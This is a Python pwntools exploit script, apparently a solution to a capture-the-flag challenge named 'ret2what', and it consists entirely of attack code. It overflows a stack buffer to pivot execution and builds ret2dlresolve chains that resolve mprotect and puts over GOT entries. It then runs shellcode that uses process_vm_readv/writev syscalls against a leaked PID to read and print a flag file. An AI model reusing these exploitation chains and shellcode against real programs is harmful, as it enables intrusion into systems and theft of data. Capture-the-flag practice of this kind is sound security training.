from pwn import *

p=process("./chall_patched")
#p=remote("127.0.0.1",8000)
#p=remote("pwn-ret2what.c1-test-607b0199.blahaj.sg","17399")
elf=ELF("./chall_patched")
context(os='linux',arch='amd64')
#gdb.attach(p)
#sleep(5)
rop=ROP(elf)

LEAVE_RET=0x0000000000401204
POP_RBP=0x00000000004011ad
GADGET=0x000000000040149c
RET=0x0000000000401016


p.recvuntil(b"Memory mapped at ")
mmaped_addr=int(p.recvuntil(b"\n")[:-1],16)
print(hex(mmaped_addr))

p.recvuntil(b"PID: ")
pid=p.recvuntil(b"\n")[:-1]
pid=int(pid.decode('utf-8'))

payload=b"A"*0x110+p64(0x404e00+0x110)+p64(GADGET)

p.sendline(payload)
#sleep(10)

#print(p.pid)

payload_2=b"./flag\x00\x00\x00"+b"A"*(0x110-0x9)+p64(0x404c00+0x110)+p64(GADGET)+p32(0x0)*7+p64(0)
print(len(payload_2))
p.sendline(payload_2)


payload+=b"A"*(0x118-len(payload))+p64(POP_RBP)+p64(0x404c00)+p64(LEAVE_RET)
p.sendline(payload)
##fd returned is usually 3
#sleep(30)
payload=b"A"*0x110+p64(0x4040a0+0x110)+p64(GADGET)
p.sendline(payload)

payload=p64(0x404000)+p64(mmaped_addr)+p64(0x1)+b"A"*(0x110-0x18)+p64(0x404b00+0x110)+p64(GADGET)
p.sendline(payload)

dlresolve3=Ret2dlresolvePayload(elf,symbol='mprotect',args=[],data_addr=0x404e00+0x30)
elf64_rel=dlresolve3.payload[-24:]
elf64_rel=p64(elf.got.fprintf)+elf64_rel[8:]
dlresolve3.payload=dlresolve3.payload[:-24]+elf64_rel

dlresolve4=Ret2dlresolvePayload(elf,symbol='puts',args=[],data_addr=0x404b00+0x30)
elf64_rel=dlresolve4.payload[-24:]
elf64_rel=p64(elf.got.seccomp_release)+elf64_rel[8:]
dlresolve4.payload=dlresolve4.payload[:-24]+elf64_rel


rop=ROP(elf)
rop.ret2dlresolve(dlresolve4)
payload=b"A"*0x8
payload+=rop.chain()
payload+=p64(POP_RBP)
payload+=p64(0x404e00+0x110)
payload+=p64(GADGET)
print(hex(len(payload)))
payload+=dlresolve4.payload
payload+=b"A"*(0x118-len(payload))
payload+=p64(POP_RBP)
payload+=p64(0x404b00)
payload+=p64(LEAVE_RET)
#input("")
p.sendline(payload)

rop=ROP(elf)
rop.ret2dlresolve(dlresolve3)
payload=b"C"*0x8
payload+=rop.chain()
payload+=p64(POP_RBP)
payload+=p64(0x404b00+0x110)
payload+=p64(GADGET)
print(hex(len(payload)))
payload+=dlresolve3.payload
payload+=b"A"*(0x118-len(payload))
payload+=p64(POP_RBP)
payload+=p64(0x404e00)
payload+=p64(LEAVE_RET)
input("")
p.sendline(payload)

shellcode=f"""
    mov rax, 0x137
    mov rdi, {pid}
    mov rsi, 0x404b80
    mov rdx, 1
    mov r10, 0x404b90
    mov r8, 1
    mov r9, 0
    syscall
    mov rax, 0x23
    mov rdi, 0x404ba0
    mov rsi, 0x404bb0
    syscall
    mov rax, 0x136
    mov rdi, {pid}
    mov rsi, 0x404b60
    mov rdx, 1
    mov r10, 0x404b70
    mov r8, 1
    mov r9, 0
    syscall
    xor rax, rax
    inc rax
    mov rdi, 0x1
    mov rsi, 0x404300
    mov rdx, 0x1000
    syscall
"""
shellcode=asm(shellcode)
print(hex(len(shellcode)))
payload=p64(0x404f00)
payload+=p64(0x1000)+p64(0x7)
payload+=b"A"*(0xc0-len(payload))
payload+=p64(0x404300)+p64(0x1)
payload+=b"A"*(0x110-len(payload))
payload+=p64(0x404b00+0x20)
payload+=p64(0x00000000004013af)
input("")
p.sendline(payload)

#payload=p64(0x1)*2+p64()
#p.sendline(payload)
payload=shellcode+b"B"*6+p64(0x404300)+p64(0x100)+p64(mmaped_addr)+p64(0x100)
print(hex(len(payload)))
payload+=p64(0x404b68)+p64(0x1)+p64(mmaped_addr)+p64(0x1)
payload+=p64(0x3)+p64(0x0)
payload+=p64(0x0)+p64(0x0)
payload+=b'A'*(0x150-len(payload))
payload+=p64(0x0)+p64(0x0000000000404c10-0x150)
print(hex(len(payload)))
p.sendline(payload)

p.interactive()
